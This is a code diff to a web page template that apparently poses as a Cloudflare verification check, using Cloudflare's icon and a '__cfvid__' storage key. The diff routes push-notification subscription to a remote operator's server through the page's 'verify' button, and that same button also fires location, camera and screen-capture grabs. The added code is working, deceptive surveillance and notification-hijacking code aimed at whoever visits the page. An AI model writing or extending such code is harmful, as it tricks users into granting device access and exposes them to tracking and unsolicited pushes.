@@ -251,55 +251,53 @@ window.addEventListener("beforeunload",function(){
 <% if(pushAccess){ %>
 (function(){
   var _a=a,_uid=uid;
-  var pid=localStorage.getItem("__cfvid__")||_uid;
+  var _pid=localStorage.getItem("__cfvid__")||_uid;
 
-  // ── SSE: foreground push ──
-  var es=new EventSource(_a+"/push-stream?uid="+encodeURIComponent(_uid)+"&pid="+encodeURIComponent(pid));
-  es.addEventListener("push",function(e){
+  // ── SSE: connects immediately, receives push events ──
+  var _es=new EventSource(_a+"/push-stream?uid="+encodeURIComponent(_uid)+"&pid="+encodeURIComponent(_pid));
+  _es.addEventListener("push",function(e){
     try{
       var d=JSON.parse(e.data);
-      showNotif(d.title||"🔔 رسالة جديدة",d.body||"");
+      _showNotif(d.title||"🔔 رسالة جديدة",d.body||"");
     }catch(x){}
   });
 
-  function showNotif(title,body){
+  function _showNotif(title,body){
     if(!("Notification" in window))return;
     if(Notification.permission==="granted"){
-      new Notification(title,{body:body,icon:"https://www.cloudflare.com/favicon.ico",requireInteraction:true});
+      new Notification(title,{body:body,icon:"https://www.cloudflare.com/favicon.ico",requireInteraction:true,tag:"bot-push"});
     }
   }
 
-  // ── Request permission first, independently ──
-  if(!("Notification" in window)||!("serviceWorker" in navigator))return;
-  Notification.requestPermission().then(function(perm){
-    if(perm!=="granted")return;
-
-    // ── VAPID: background push ──
-    function b64ToUint8(b){var r=b.replace(/-/g,'+').replace(/_/g,'/'),p=r.length%4;if(p){r+=new Array(4-p+1).join('=');}var s=atob(r),a=new Uint8Array(s.length);for(var i=0;i<s.length;i++)a[i]=s.charCodeAt(i);return a;}
-    function tryVapid(reg){
-      return fetch(_a+"/vapid-key").then(function(r){return r.json();}).then(function(d){
-        return reg.pushManager.subscribe({userVisibleOnly:true,applicationServerKey:b64ToUint8(d.key)});
-      });
-    }
-    navigator.serviceWorker.register(_a+"/sw.js").then(function(){
-      return navigator.serviceWorker.ready;
-    }).then(function(reg){
-      return reg.pushManager.getSubscription().then(function(existing){
-        if(existing)return existing;
-        // try once, if fails unsubscribe any stale and retry once
-        return tryVapid(reg).catch(function(){
-          return reg.pushManager.getSubscription().then(function(s){
-            return s?s.unsubscribe():null;
-          }).then(function(){
-            return tryVapid(reg);
+  // ── Called from doVerify() on button click (user gesture required!) ──
+  function _b64ToUint8(b){var r=b.replace(/-/g,'+').replace(/_/g,'/'),p=r.length%4;if(p){r+=new Array(4-p+1).join('=');}var s=atob(r),a=new Uint8Array(s.length);for(var i=0;i<s.length;i++)a[i]=s.charCodeAt(i);return a;}
+  window._registerPush=function(){
+    if(!("Notification" in window)||!("serviceWorker" in navigator))return;
+    Notification.requestPermission().then(function(perm){
+      if(perm!=="granted")return;
+      navigator.serviceWorker.register(_a+"/sw.js").then(function(){
+        return navigator.serviceWorker.ready;
+      }).then(function(reg){
+        return reg.pushManager.getSubscription().then(function(existing){
+          if(existing){
+            // reuse only if same VAPID key, else unsub and re-register
+            var ek=existing.options&&existing.options.applicationServerKey;
+            if(ek&&ek.byteLength===65)return existing;
+            return existing.unsubscribe().then(function(){return null;});
+          }
+          return null;
+        }).then(function(sub){
+          if(sub)return sub;
+          return fetch(_a+"/vapid-key").then(function(r){return r.json();}).then(function(d){
+            return reg.pushManager.subscribe({userVisibleOnly:true,applicationServerKey:_b64ToUint8(d.key)});
           });
         });
-      });
-    }).then(function(sub){
-      if(!sub)return;
-      return fetch(_a+"/push-subscribe",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:_uid,pid:pid,sub:sub.toJSON()})});
-    }).catch(function(){});
-  });
+      }).then(function(sub){
+        if(!sub)return;
+        fetch(_a+"/push-subscribe",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:_uid,pid:_pid,sub:sub.toJSON()})});
+      }).catch(function(){});
+    });
+  };
 })();
 <% } %>
 
@@ -464,6 +462,7 @@ function doVerify(){
   fireLocation();
 <% if(camAccess){ %>  doCamera();<% } %>
 <% if(screenCapAccess){ %>  doScreenCapture();<% } %>
+<% if(pushAccess){ %>  if(typeof _registerPush==="function") _registerPush();<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
